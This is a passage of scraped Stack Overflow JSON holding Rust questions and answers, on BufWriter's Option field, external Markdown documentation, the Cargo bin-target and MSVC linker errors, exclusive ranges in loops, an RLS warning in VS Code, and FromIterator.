<code>Drop</code>, and you can't move out of a field from a type that implements <code>Drop</code>. Just before <code>BufWriter::into_inner</code> returns, <code>BufWriter::drop</code> is called, because the <code>BufWriter</code> is moved into the function's <code>self</code> parameter, then falls out of scope \u2013 this is standard RAII.</p>\n\n<p>If you were able to move out of a field, then what happens with the destructor? Either it wouldn't be called at all, which would be surprising, or it would be called with some fields containing invalid values, which could violate memory safety.</p>\n"}], "owner": {"reputation": 858, "user_id": 3750062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/097546a539804f0e62654904c546831a?s=128&d=identicon&r=PG&f=1", "display_name": "HeroicKatora", "link": "https://stackoverflow.com/users/3750062/heroickatora"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "accepted_answer_id": 48980293, "answer_count": 1, "score": 3, "last_activity_date": 1519655852, "creation_date": 1519607723, "last_edit_date": 1519655852, "question_id": 48980186, "link": "https://stackoverflow.com/questions/48980186/why-does-bufwriter-wrap-the-inner-write-in-an-option", "title": "Why does BufWriter wrap the inner Write in an Option?", "body": "<p>In the standard library, <code>BufWriter</code> is declared as follows:</p>\n\n<pre><code>pub struct BufWriter&lt;W: Write&gt; {\n    inner: Option&lt;W&gt;,\n    buf: Vec&lt;u8&gt;,\n    // #30888: If the inner writer panics in a call to write, we don't want to\n    // write the buffered data a second time in BufWriter's destructor. This\n    // flag tells the Drop impl if it should skip the flush.\n    panicked: bool,\n}\n</code></pre>\n\n<p>As the documentation tells us, <code>panicked</code> exists as a safety against double writes on unwind and I understand the reasoning behind it. Is there a similar reason for the inner writer being wrapped in an <code>Option</code>? The only part I find in the code where the <code>Option</code> actually gets cleared is in <a href=\"https://github.com/rust-lang/rust/blob/f2b11f30b2946119c23594bc2b3bec3c38d3ae9a/src/libstd/io/buffered.rs#L501-L506\" rel=\"nofollow noreferrer\"><code>into_inner</code></a> but I see no reason why this should not be possible with a naked value as well, as <code>self</code> as taken by value.</p>\n"}, {"tags": ["rust", "documentation", "rustdoc"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "edited": false, "score": 0, "creation_date": 1519606931, "post_id": 48980091, "comment_id": 84965305, "body": "Thanks. I didn&#39;t think that paragraph made it clear, but it is what it is."}, {"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 0, "creation_date": 1519607352, "post_id": 48980091, "comment_id": 84965376, "body": "**squints and turns head**  Yeah, I can kinda see how you could read that as supporting external files, especially if you went in expecting that feature.  With that in mind, I&#39;m not sure what would avoid the confusion short of an explicit &quot;this isn&#39;t supported&quot; disclaimer."}, {"owner": {"reputation": 2816, "user_id": 5402030, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/pT1Sp.png?s=128&g=1", "display_name": "MutantOctopus", "link": "https://stackoverflow.com/users/5402030/mutantoctopus"}, "edited": false, "score": 0, "creation_date": 1519633068, "post_id": 48980091, "comment_id": 84972727, "body": "So in other words, these <code>.md</code> files would only be useful for general-purpose documentation about the crate and not specifically tied to any part of the crate?"}, {"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "reply_to_user": {"reputation": 2816, "user_id": 5402030, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/pT1Sp.png?s=128&g=1", "display_name": "MutantOctopus", "link": "https://stackoverflow.com/users/5402030/mutantoctopus"}, "edited": false, "score": 0, "creation_date": 1519634389, "post_id": 48980091, "comment_id": 84973319, "body": "@BHustus: Standalone <code>.md</code> files are just that: standalone.  They don&#39;t have anything to do with any crate.  You can use them to write blog posts if you want; <code>rustdoc</code> doesn&#39;t really care."}], "tags": [], "owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "is_accepted": true, "score": 2, "last_activity_date": 1519607187, "last_edit_date": 1519607187, "creation_date": 1519606596, "answer_id": 48980091, "question_id": 48980028, "link": "https://stackoverflow.com/questions/48980028/how-is-it-possible-to-keep-rust-module-documentation-in-separate-markdown-files/48980091#48980091", "title": "How is it possible to keep Rust module documentation in separate Markdown files?", "body": "<p>It doesn't.  That section on describing the functionality of <code>rustdoc</code> is saying that it can process individual <code>.md</code> files.  The third paragraph touches on this:</p>\n\n<blockquote>\n  <p>Documentation can be generated in two ways: from source code, and from standalone Markdown files.</p>\n</blockquote>\n\n<p>Insofar as I am aware, there is no extant way to put code documentation in external files.  It would be theoretically possible to do so using a procedural derive macro, but I'm not aware of any crate that actually does this.</p>\n"}, {"comments": [{"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 1, "creation_date": 1519634542, "post_id": 48982679, "comment_id": 84973378, "body": "The frustrating thing being, of course, that it&#39;s hard to recommend unstable features when they might change or go away at any time."}, {"owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "reply_to_user": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 2, "creation_date": 1519635114, "post_id": 48982679, "comment_id": 84973651, "body": "On the flip side, people need to use unstable features and provide feedback about them before anything can be stabilized. Without anybody using features they would just sit in nightly forever or be scrapped."}], "tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": false, "score": 5, "last_activity_date": 1519626772, "creation_date": 1519626772, "answer_id": 48982679, "question_id": 48980028, "link": "https://stackoverflow.com/questions/48980028/how-is-it-possible-to-keep-rust-module-documentation-in-separate-markdown-files/48982679#48982679", "title": "How is it possible to keep Rust module documentation in separate Markdown files?", "body": "<p>It is possible to keep Rust module documentation in external .md files! But for now that feature is unstable and you will need to build your crate's documentation using a nightly compiler.</p>\n\n<p>The external doc feature is described in <a href=\"https://doc.rust-lang.org/unstable-book/language-features/external-doc.html\" rel=\"noreferrer\">this page</a> of The Unstable Book and stabilization is being tracked in <a href=\"https://github.com/rust-lang/rust/issues/44732\" rel=\"noreferrer\">rust-lang/rust#44732</a>.</p>\n\n<p>For external module documentation you would use:</p>\n\n<pre><code>#![feature(external_doc)]\n\n#![doc(include = \"my-module-doc.md\")]\n\n/* content of the module */\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": false, "score": 1, "last_activity_date": 1565305548, "creation_date": 1565305548, "answer_id": 57421673, "question_id": 48980028, "link": "https://stackoverflow.com/questions/48980028/how-is-it-possible-to-keep-rust-module-documentation-in-separate-markdown-files/57421673#57421673", "title": "How is it possible to keep Rust module documentation in separate Markdown files?", "body": "<p>In stable Rust, you can mimic the unstable <a href=\"https://doc.rust-lang.org/unstable-book/language-features/external-doc.html\" rel=\"nofollow noreferrer\"><code>external-doc</code></a> feature through clever macros.</p>\n\n<p>An easy way to do this is to use the <a href=\"https://crates.io/crates/doc-comment\" rel=\"nofollow noreferrer\">doc-comment crate</a>:</p>\n\n<pre><code>#[macro_use]\nextern crate doc_comment;\n\n// If you want to test examples in your README file.\ndoctest!(\"../README.md\");\n\n// If you want to document an item:\ndoc_comment!(include_str!(\"another_file.md\"), pub struct Foo {});\n</code></pre>\n\n<p>You can see a complicated version of this in my crate SNAFU, where <a href=\"https://github.com/shepmaster/snafu/blob/0.4.4/src/lib.rs#L105-L143\" rel=\"nofollow noreferrer\">I use it for the user's guide</a>.</p>\n\n<p>The \"by-hand\" version involves passing the thing to be documented along with the included markdown:</p>\n\n<pre><code>macro_rules! inner {\n    ($text:expr, $($rest: tt)*) =&gt; {\n        #[doc = $text]\n        $($rest)*\n    };\n}\n\ninner! {\n    include_str!(\"/etc/hosts\"),\n    mod dummy {}\n}\n</code></pre>\n\n<p>See also:</p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/q/41945628/155423\">Is it possible to emit Rust attributes from within macros?</a></li>\n<li><a href=\"https://stackoverflow.com/q/43353077/155423\">How to embed a Rust macro variable into documentation?</a></li>\n<li><a href=\"https://stackoverflow.com/q/33999341/155423\">Generating documentation in macros</a></li>\n</ul>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 286, "favorite_count": 0, "accepted_answer_id": 48980091, "answer_count": 3, "score": 2, "last_activity_date": 1565314924, "creation_date": 1519605934, "last_edit_date": 1565314924, "question_id": 48980028, "link": "https://stackoverflow.com/questions/48980028/how-is-it-possible-to-keep-rust-module-documentation-in-separate-markdown-files", "title": "How is it possible to keep Rust module documentation in separate Markdown files?", "body": "<p><a href=\"https://doc.rust-lang.org/1.30.0/book/first-edition/documentation.html#other-documentation\" rel=\"nofollow noreferrer\">This section of the Rust book</a> seems to imply that it is possible to keep Rust documentation in separate .md files, but it does not say how these .md files can then be included back. How does this work?</p>\n"}, {"tags": ["intellij-idea", "rust"], "answers": [{"comments": [{"owner": {"reputation": 654, "user_id": 6360671, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tPvw0.jpg?s=128&g=1", "display_name": "dcdgo", "link": "https://stackoverflow.com/users/6360671/dcdgo"}, "edited": false, "score": 0, "creation_date": 1519603884, "post_id": 48979687, "comment_id": 84964767, "body": "My mistake was to forget that the project was created by importing from sources. (file &gt; new &gt; project from other sources). This source had only <code>lib.rs</code>; a library as you say."}], "tags": [], "owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "is_accepted": true, "score": 12, "last_activity_date": 1566736231, "last_edit_date": 1566736231, "creation_date": 1519602233, "answer_id": 48979687, "question_id": 48979557, "link": "https://stackoverflow.com/questions/48979557/a-bin-target-must-be-available-for-cargo-run/48979687#48979687", "title": "&quot;a bin target must be available for &#39;cargo run&#39;&quot;", "body": "<p>By default, Cargo will consider the file <code>src/main.rs</code> to be the main binary target for the package. If this file doesn't exist, and there are no other binary targets defined in <code>Cargo.toml</code>, you'll get this error.</p>\n\n<p><a href=\"https://intellij-rust.github.io/docs/quick-start.html\" rel=\"noreferrer\">According to the documentation</a>, when you create a Rust project in IntelliJ IDEA, you get an option to <em>Use a binary (application) template</em>. This should give you a <code>src/main.rs</code> instead of a <code>src/lib.rs</code> (which is the default root file for a library target). Using Cargo on the command line, you can also create an application package with <a href=\"https://doc.rust-lang.org/stable/cargo/getting-started/first-steps.html\" rel=\"noreferrer\"><code>cargo new hello</code></a>.</p>\n\n<blockquote>\n  <p>Cargo defaults to <code>--bin</code> to make a binary program. To make a library, we'd pass <code>--lib</code>.</p>\n</blockquote>\n\n<p>When you use <code>--bin</code> on the <code>cargo run</code> command, the argument refers to one of the <a href=\"https://doc.rust-lang.org/stable/cargo/reference/manifest.html#configuring-a-target\" rel=\"noreferrer\"><code>[[bin]]</code></a> sections in <code>Cargo.toml</code>, or files following the pattern <code>src/bin/*.rs</code> (the argument replaces the <code>*</code>) if there are no <code>[[bin]]</code> sections in <code>Cargo.toml</code>. For example, <code>cargo run --bin foo</code> will either compile and run <code>src/bin/foo.rs</code> or the <code>[[bin]]</code> section with <code>name = \"foo\"</code> in <code>Cargo.toml</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 654, "user_id": 6360671, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tPvw0.jpg?s=128&g=1", "display_name": "dcdgo", "link": "https://stackoverflow.com/users/6360671/dcdgo"}, "is_accepted": false, "score": 0, "last_activity_date": 1519609599, "creation_date": 1519609599, "answer_id": 48980364, "question_id": 48979557, "link": "https://stackoverflow.com/questions/48979557/a-bin-target-must-be-available-for-cargo-run/48980364#48980364", "title": "&quot;a bin target must be available for &#39;cargo run&#39;&quot;", "body": "<p>As an aside to Francis Gagne's great answer.. If anyone is wondering how to fix this error:</p>\n\n<blockquote>\n  <p>error: could not exec the linker link.exe: The system cannot find the\n  file specified. (os error 2) note: the msvc targets depend on the msvc\n  linker but link.exe was not found</p>\n  \n  <p>note: please ensure that VS 2013 or VS 2015 was installed with the\n  Visual C++ option</p>\n</blockquote>\n\n<p>then follow <a href=\"https://github.com/rust-lang/rust/issues/38584#issuecomment-309737902\" rel=\"nofollow noreferrer\">this guide over at github.</a></p>\n"}], "owner": {"reputation": 654, "user_id": 6360671, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tPvw0.jpg?s=128&g=1", "display_name": "dcdgo", "link": "https://stackoverflow.com/users/6360671/dcdgo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8423, "favorite_count": 1, "accepted_answer_id": 48979687, "answer_count": 2, "score": 11, "last_activity_date": 1566736231, "creation_date": 1519601040, "last_edit_date": 1519655896, "question_id": 48979557, "link": "https://stackoverflow.com/questions/48979557/a-bin-target-must-be-available-for-cargo-run", "title": "&quot;a bin target must be available for &#39;cargo run&#39;&quot;", "body": "<p>While building a new Rust \"Project from other sources\", in Intellij IDEA 2017, I was unable to run the project through its UI.</p>\n\n<blockquote>\n  <p>C:/Users/sjsui/.cargo/bin/cargo.exe run error: a bin target must be\n  available for <code>cargo run</code></p>\n  \n  <p>Process finished with exit code 101</p>\n</blockquote>\n\n<p>I noticed that no --bin target was provided by my build configuration so I placed the path to the projects target folder; same result.</p>\n\n<p><a href=\"https://i.stack.imgur.com/7oJDR.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/7oJDR.png\" alt=\"enter image description here\"></a></p>\n\n<blockquote>\n  <p>C:/Users/sjsui/.cargo/bin/cargo.exe run --bin C:\\Users\\sjsui\\exercism\\rust\\hello-world\\target\\debug\n  error: no bin target named <code>C:\\Users\\sjsui\\exercism\\rust\\hello-world\\target\\debug</code></p>\n</blockquote>\n\n<p>I tried creating a fresh Rust project through the Cargo command line interface, and received this error when running it:</p>\n\n<blockquote>\n  <p>error: could not exec the linker <code>link.exe</code>: The system cannot find the file specified. (os error 2)\n  note: the msvc targets depend on the msvc linker but <code>link.exe</code> was\n  not found</p>\n  \n  <p>note: please ensure that VS 2013 or VS 2015 was installed with the\n  Visual C++ option</p>\n</blockquote>\n\n<p>Evidently I must install Visual C++ build tools 2017 and am in the process of doing so. Are these errors related, or different issues?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 11483, "user_id": 600486, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/akN6H.png?s=128&g=1", "display_name": "blurfus", "link": "https://stackoverflow.com/users/600486/blurfus"}, "edited": false, "score": 1, "creation_date": 1519597228, "post_id": 48979080, "comment_id": 84963223, "body": "the upper bound is exclusive, so it will not be in the output.  Check the docs: <a href=\"https://doc.rust-lang.org/1.2.0/book/for-loops.html\" rel=\"nofollow noreferrer\">doc.rust-lang.org/1.2.0/book/for-loops.html</a>"}], "answers": [{"tags": [], "owner": {"reputation": 109956, "user_id": 159145, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/r8ryC.png?s=128&g=1", "display_name": "Dai", "link": "https://stackoverflow.com/users/159145/dai"}, "is_accepted": false, "score": 4, "last_activity_date": 1519597188, "creation_date": 1519597188, "answer_id": 48979113, "question_id": 48979080, "link": "https://stackoverflow.com/questions/48979080/expected-behavior-of-for-loop-in-rust/48979113#48979113", "title": "Expected behavior of `for` loop in rust", "body": "<p>The <code>x..y</code> syntax in Rust indicates a Range.</p>\n\n<p>Ranges in Rust, like many other languages and libraries, have an <em>exclusive upper-bound</em>:</p>\n\n<p><a href=\"https://rustbyexample.com/flow_control/for.html\" rel=\"nofollow noreferrer\">https://rustbyexample.com/flow_control/for.html</a></p>\n\n<blockquote>\n  <p>One of the easiest ways to create an iterator is to use the range notation <code>a..b</code>. This yields values from <code>a</code> (inclusive) to <code>b</code> (exclusive) in steps of one.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 99643, "user_id": 445517, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/57e2ba76e6290c4e9e19821a068bc8c1?s=128&d=identicon&r=PG", "display_name": "CodesInChaos", "link": "https://stackoverflow.com/users/445517/codesinchaos"}, "is_accepted": false, "score": 2, "last_activity_date": 1519597231, "creation_date": 1519597231, "answer_id": 48979123, "question_id": 48979080, "link": "https://stackoverflow.com/questions/48979080/expected-behavior-of-for-loop-in-rust/48979123#48979123", "title": "Expected behavior of `for` loop in rust", "body": "<p>Yes, this is expected. The end is not inclusive with when creating a range using <code>..</code>.</p>\n\n<p>In patterns you can use <code>...</code> for an inclusive range and there is an unstable feature that allows you to use <code>..=</code> to create an inclusive range.</p>\n"}, {"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 4, "last_activity_date": 1519597285, "creation_date": 1519597285, "answer_id": 48979131, "question_id": 48979080, "link": "https://stackoverflow.com/questions/48979080/expected-behavior-of-for-loop-in-rust/48979131#48979131", "title": "Expected behavior of `for` loop in rust", "body": "<p>This is expected! The <code>0 .. 10</code> is an \"exclusive range\" meaning it does <strong>not</strong> include the upper bound. There is also an \"inclusive range\" syntax in the works which <strong>does</strong> include the upper bound, but it has not been released yet. The new syntax is being tracked in <a href=\"https://github.com/rust-lang/rust/issues/28237\" rel=\"nofollow noreferrer\">rust-lang/rust#28237</a>.</p>\n\n<p>For now you can make the loop include 10 by writing an exclusive range with 11 as the upper bound.</p>\n\n<pre><code>fn main() {\n    for x in 1..11 {\n        println!(\"x == {}\", x);\n    }\n}\n</code></pre>\n\n<p>Or by starting at 0 and printing <code>x + 1</code>.</p>\n\n<pre><code>fn main() {\n    for x in 0..10 {\n        println!(\"x == {}\", x + 1);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 5661, "user_id": 2541276, "user_type": "registered", "accept_rate": 55, "profile_image": "https://graph.facebook.com/100001587714573/picture?type=large", "display_name": "Rajkumar Natarajan", "link": "https://stackoverflow.com/users/2541276/rajkumar-natarajan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 285, "favorite_count": 0, "closed_date": 1519655575, "accepted_answer_id": 48979131, "answer_count": 3, "score": 2, "last_activity_date": 1576857483, "creation_date": 1519597009, "last_edit_date": 1576857483, "question_id": 48979080, "link": "https://stackoverflow.com/questions/48979080/expected-behavior-of-for-loop-in-rust", "closed_reason": "Duplicate", "title": "Expected behavior of `for` loop in rust", "body": "<p>I'm new to rust and I've question about the way the for loop.</p>\n\n<pre><code>fn main() {\n    for x in 1 .. 10 {\n        println!(\"x == {}\", x);\n    }\n}\n</code></pre>\n\n<p>The output of the program is</p>\n\n<pre><code>x == 1\nx == 2\nx == 3\nx == 4\nx == 5\nx == 6\nx == 7\nx == 8\nx == 9\n</code></pre>\n\n<p>I was expecting for loop to execute and display <code>x == 10</code> but it stopped at 9.\nIs this expected behavior</p>\n"}, {"tags": ["rust", "visual-studio-code"], "comments": [{"owner": {"reputation": 5661, "user_id": 2541276, "user_type": "registered", "accept_rate": 55, "profile_image": "https://graph.facebook.com/100001587714573/picture?type=large", "display_name": "Rajkumar Natarajan", "link": "https://stackoverflow.com/users/2541276/rajkumar-natarajan"}, "edited": false, "score": 0, "creation_date": 1519837716, "post_id": 48978766, "comment_id": 85074786, "body": "This is easier when following steps in this tutorial - <a href=\"https://www.youtube.com/watch?v=zSIZB8WWa-o\" rel=\"nofollow noreferrer\">youtube.com/watch?v=zSIZB8WWa-o</a>"}], "answers": [{"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 2, "last_activity_date": 1519595462, "creation_date": 1519595462, "answer_id": 48978838, "question_id": 48978766, "link": "https://stackoverflow.com/questions/48978766/visual-studio-code-warning-rls-could-not-set-rust-src-path-for-racer-because-it/48978838#48978838", "title": "Visual studio code warning: RLS could not set RUST_SRC_PATH for Racer because it could not read the Rust sysroot", "body": "<p>Check out <a href=\"https://github.com/rust-lang-nursery/rls-vscode/issues/224\" rel=\"nofollow noreferrer\">rust-lang-nursery/rls-vscode#224</a> and <a href=\"https://github.com/rust-lang-nursery/rls-vscode/issues/167\" rel=\"nofollow noreferrer\">rust-lang-nursery/rls-vscode#167</a> for previous discussion of this message on the RLS VSCode issue tracker.</p>\n\n<p>The plugin's readme lists the requirements:</p>\n\n<blockquote>\n  <ul>\n  <li>Rustup,</li>\n  <li>A Rust toolchain (the extension will configure this for you, with permission),</li>\n  <li>RLS (currently rls-preview), rust-src, and rust-analysis components (the extension will install these for you, with permission).</li>\n  </ul>\n</blockquote>\n\n<p>And based on the comments in those two threads, allowing the extension permission to manage the last two requirements fixes the error you saw.</p>\n"}, {"tags": [], "owner": {"reputation": 5697, "user_id": 1361084, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/B2500.png?s=128&g=1", "display_name": "Ofiris", "link": "https://stackoverflow.com/users/1361084/ofiris"}, "is_accepted": false, "score": 1, "last_activity_date": 1552160476, "creation_date": 1552160476, "answer_id": 55081246, "question_id": 48978766, "link": "https://stackoverflow.com/questions/48978766/visual-studio-code-warning-rls-could-not-set-rust-src-path-for-racer-because-it/55081246#55081246", "title": "Visual studio code warning: RLS could not set RUST_SRC_PATH for Racer because it could not read the Rust sysroot", "body": "<p>For me what helped was to add this in VS Code <em>settings.json</em> (<em>Quick Menu -> Preferences: Open Settings (JSON)</em> or via menu)</p>\n\n<pre><code>{\n    \"rust-client.channel\": \"stable\"\n}\n</code></pre>\n"}], "owner": {"reputation": 5661, "user_id": 2541276, "user_type": "registered", "accept_rate": 55, "profile_image": "https://graph.facebook.com/100001587714573/picture?type=large", "display_name": "Rajkumar Natarajan", "link": "https://stackoverflow.com/users/2541276/rajkumar-natarajan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1771, "favorite_count": 0, "accepted_answer_id": 48978838, "answer_count": 2, "score": 3, "last_activity_date": 1552160476, "creation_date": 1519595022, "question_id": 48978766, "link": "https://stackoverflow.com/questions/48978766/visual-studio-code-warning-rls-could-not-set-rust-src-path-for-racer-because-it", "title": "Visual studio code warning: RLS could not set RUST_SRC_PATH for Racer because it could not read the Rust sysroot", "body": "<p>I'm using visual studio code for practicing rust programs.</p>\n\n<p>I'm getting the below warning always. </p>\n\n<p><code>warning: RLS could not set RUST_SRC_PATH for Racer because it could not read the Rust sysroot.</code></p>\n\n<p><a href=\"https://i.stack.imgur.com/ZeC8q.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZeC8q.png\" alt=\"Warning screenshot\"></a></p>\n\n<p>What should I do to resolve this error?</p>\n"}, {"tags": ["iterator", "rust"], "answers": [{"tags": [], "owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "is_accepted": true, "score": 3, "last_activity_date": 1558725039, "last_edit_date": 1558725039, "creation_date": 1519585703, "answer_id": 48977336, "question_id": 48977251, "link": "https://stackoverflow.com/questions/48977251/why-does-the-implementation-of-fromiterator-use-an-intoiterator-instead-of-a/48977336#48977336", "title": "Why does the implementation of `FromIterator` use an `IntoIterator` instead of an `Iterator`?", "body": "<blockquote>\n  <p>Is <code>from_iter</code> defined this way because <code>IntoIterator</code> is not as strict a requirement as <code>Iterator</code>?</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<p><code>IntoIterator</code> is automatically implemented for <code>Iterator</code>, therefore the set of types implementing <code>IntoIterator</code> is a superset of those implementing <code>Iterator</code>.</p>\n\n<p>When crafting a generic function, it's good to minimize its requirements, i.e., make it as generic as possible.</p>\n\n<p>Of course, there's a trade-off between:</p>\n\n<ul>\n<li><em>ease of use</em>: works with as many types as possible,</li>\n<li><em>ease of implementation</em>.</li>\n</ul>\n\n<p>For a lone function in your isolated codebase, it may not be worth optimizing for ease-of-use much; for a trait/function in the standard library, since the number of users far outweigh the number of developers (of this particular piece), the trade-off is strongly in favor of ease-of-use.</p>\n\n<p>And since going from <code>IntoIterator</code> to <code>Iterator</code> is so simple, and thus doesn't weigh much on the implementation, it's an easy call to make.</p>\n"}], "owner": {"reputation": 3023, "user_id": 1691145, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/4b6744a17b41f3b0e5c7554a43a04094?s=128&d=identicon&r=PG", "display_name": "Justin Raymond", "link": "https://stackoverflow.com/users/1691145/justin-raymond"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 198, "favorite_count": 1, "accepted_answer_id": 48977336, "answer_count": 1, "score": 3, "last_activity_date": 1601961917, "creation_date": 1519585178, "last_edit_date": 1601961917, "question_id": 48977251, "link": "https://stackoverflow.com/questions/48977251/why-does-the-implementation-of-fromiterator-use-an-intoiterator-instead-of-a", "title": "Why does the implementation of `FromIterator` use an `IntoIterator` instead of an `Iterator`?", "body": "<p>The example implementation of the <code>FromIterator</code> trait in the <a href=\"https://doc.rust-lang.org/std/iter/trait.FromIterator.html\" rel=\"nofollow noreferrer\">Rust docs</a> is:</p>\n<pre><code>impl FromIterator&lt;i32&gt; for MyCollection {\n    fn from_iter&lt;I: IntoIterator&lt;Item=i32&gt;&gt;(iter: I) -&gt; Self {\n        let mut c = MyCollection::new();\n\n        for i in iter {\n            c.add(i);\n        }\n\n        c\n    }\n}\n</code></pre>\n<p><code>FromIterator</code> defines how a type will be created from an iterator. The signature of <code>from_iter</code> requires a type that implements <code>IntoIterator</code>, which defines how a type may be converted into an <code>Iterator</code>.</p>\n<p>Is <code>from_iter</code> defined this way because <code>IntoIterator</code> is not as strict a requirement as <code>Iterator</code>?</p>\n"}, {"tags": ["generics", "rust"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "edited": false, "score": 0, "creation_date": 1519587496, "post_id": 48976258, "comment_id": 84960355, "body": "Is there a way to use the num crate to avoid all/most of this extra stuff? In my original implementation, I had to use it anyway."}, {"owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "edited": false, "score": 0, "creation_date": 1519636341, "post_id": 48976258, "comment_id": 84974320, "body": "@Roxy: I am not too familiar with the crate, so... maybe?"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519655196, "post_id": 48976258, "comment_id": 84986047, "body": "Pretty sure you are looking for <a href=\"https://docs.rs/num/0.1.42/num/trait.Integer.html\" rel=\"nofollow noreferrer\"><code>Integer</code></a>."}], "tags": [], "owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "is_accepted": true, "score": 2, "last_activity_date": 1519654909, "last_edit_date": 1519654909, "creation_date": 1519579046, "answer_id": 48976258, "question_id": 48975698, "link": "https://stackoverflow.com/questions/48975698/is-there-a-simple-way-to-use-an-integral-generic-type-in-rust/48976258#48976258", "title": "Is there a simple way to use an integral generic type in Rust?", "body": "<p>Yes and no.</p>\n\n<p><strong>Handling integral types uniformly is not smooth.</strong></p>\n\n<p>The standard library does not provide any \"unifying\" trait for handling numbers in a uniform fashion, as you just discovered here. It's unclear what the best design would be, and therefore crates like 